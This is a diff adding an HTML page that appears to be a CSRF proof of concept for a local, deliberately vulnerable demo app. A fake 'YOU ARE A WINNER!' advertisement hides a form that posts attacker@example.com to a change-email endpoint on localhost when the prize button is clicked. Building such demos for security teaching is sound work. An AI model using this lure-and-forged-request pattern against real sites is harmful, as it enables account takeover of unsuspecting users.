@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advertisement</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+
+        .ad {
+            background: white;
+            border: 2px solid #333;
+            padding: 20px;
+            max-width: 400px;
+            margin: auto;
+        }
+
+        button {
+            padding: 12px 25px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="ad">
+
+    <h2>🎉 YOU ARE A WINNER!</h2>
+
+    <p>Congratulations!</p>
+
+    <p>You have won a special prize.</p>
+
+    <form
+        action="http://127.0.0.1:5000/change-email-vulnerable"
+        method="POST"
+    >
+
+        <input
+            type="hidden"
+            name="email"
+            value="attacker@example.com"
+        >
+
+        <button type="submit">
+            🎁 CLAIM YOUR PRIZE
+        </button>
+
+    </form>
+
+</div>
+
+</body>
+</html>
